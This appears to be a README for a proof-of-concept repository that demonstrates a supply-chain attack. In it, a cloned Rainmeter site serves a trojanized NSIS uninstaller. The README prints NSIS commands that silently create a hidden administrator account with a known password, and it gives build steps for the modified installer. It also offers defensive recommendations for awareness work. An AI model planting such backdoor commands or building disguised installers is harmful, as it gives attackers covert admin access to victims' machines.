# 💀 Rainfall Trap — Supply Chain Abuse via Cloned Site & Trojaned Uninstaller

> ⚠️ This repository demonstrates a security proof-of-concept (PoC) showcasing how a cloned open-source website and a trojanized installer can be used to silently gain administrator access on a target system.  
**This is for educational and awareness purposes only.**

---

## 📌 Overview

This project highlights the risks associated with downloading software from unofficial or spoofed websites, even when the project is open-source.  
It demonstrates how an attacker can:

- Clone a popular open-source project's website
- Modify the installer with malicious payloads (such as creating a hidden admin user)
- Replace the official download link with the trojanized version
- Distribute it under the guise of the original tool

The attack flow simulates how a user, tricked by a familiar interface, may unknowingly compromise their system.

---

## 🎯 Goals of This PoC

- Demonstrate trust abuse in open-source ecosystems
- Show how unverified binaries can be used for privilege escalation
- Raise awareness about distribution chain manipulation
- Encourage safer download habits and package verification

---

## 🧪 Attack Methodology

### 1. ✅ Cloning the Original Site

- Downloaded and replicated the static files of the official **[Rainmeter](https://www.rainmeter.net/)** website.
- Minor changes were made to only one file: **the download button**, which now links to a **malicious installer** hosted by the attacker.

### 2. ⚙️ Modifying the Installer

- Used **NSIS** to alter the uninstall section of the original Rainmeter installer.
- Embedded malicious logic that silently:
  - Creates a new user account named `rainmeter`
  - Sets its password to `rainmeter`
  - Adds it to the `Administrators` group

```nsis
ExecWait 'net user rainmeter rainmeter /add'
ExecWait 'net localgroup Administrators rainmeter /add'
````

This code is executed during the uninstallation (or silently embedded at any point) and **does not require user consent, because uninstallers run with administrator privileges**.

### 3. 🧪 Optional Persistence (Ethically Omitted)

A scheduled task to launch a webpage or command was considered but not implemented in this PoC to keep it within responsible disclosure limits.

---

## 💥 Impact

* **Silent privilege escalation**: A hidden administrator account is created on the target machine.
* **Abuse of user trust**: The victim installs what appears to be a legitimate open-source tool.
* **Supply chain compromise**: This scenario mirrors real-world techniques where attackers tamper with software distribution pipelines.

---
## 🛡️ Recommendations

* **Never download software from unverified or cloned sources**
* **Always verify digital signatures** or hashes when available
* Prefer official repositories (e.g., GitHub releases, Chocolatey, Winget)
* Use browser security features (Safe Browsing, HTTPS enforcement)
* Security teams should monitor for abnormal user creation or installer behavior

## 🎥 Proof of Concept (PoC)

A full demonstration video showcasing the modified uninstaller behavior and user creation.

This video walks through:
- How the modified installer/uninstaller works.
- The creation of a hidden admin user named `rainmeter`.
- The potential real-world impact of compromised open-source software distribution.
---
https://github.com/user-attachments/assets/27b0b714-dc37-4951-9b1f-75408607afca

## 🛠️ Building Rainfall Trap Installer

### 1. Get the Source Code

Use Git to clone this modified repository:

```bash
git clone https://github.com/garvthakkar17/rainfall_trap.git
````

Alternatively, download the contents as a ZIP archive directly from GitHub.

---

### 2. Prerequisites

* Install [NSIS (Nullsoft Scriptable Install System)](https://nsis.sourceforge.io/Download) version 3 or later.
* Make sure all required dependencies for building Rainmeter are available (e.g., Visual Studio, CMake if modifying Rainmeter binaries — **not required for NSIS-only payload change**).

---

### 3. Building the Installer Manually

Navigate to the `Build` directory in the cloned repo.

To compile a **pre-release version**, use:

```bash
Build.bat pre 1.2.3.4
```

To compile a **release version**, use:

```bash
Build.bat release 1.2.3.4
```

> 🔍 **Note**: Replace `1.2.3.4` with any custom version string you want for your installer.

If you encounter any `"not found"` errors during the build:

* Ensure the paths defined at the top of the `Build.bat` file correctly reflect your local environment and NSIS installation path.
* Check that the necessary folders like `Installer`, `Build`, and `Installers\PreRelease` or `Installers\Release` exist.

---
## 🚨 Responsible Use

This repository was created strictly for ethical hacking demonstrations and research.
**Do not deploy these methods in real-world environments without permission.**

> 🧑‍💻 Research by a cybersecurity practitioner focused on improving awareness of software supply chain attacks.

---
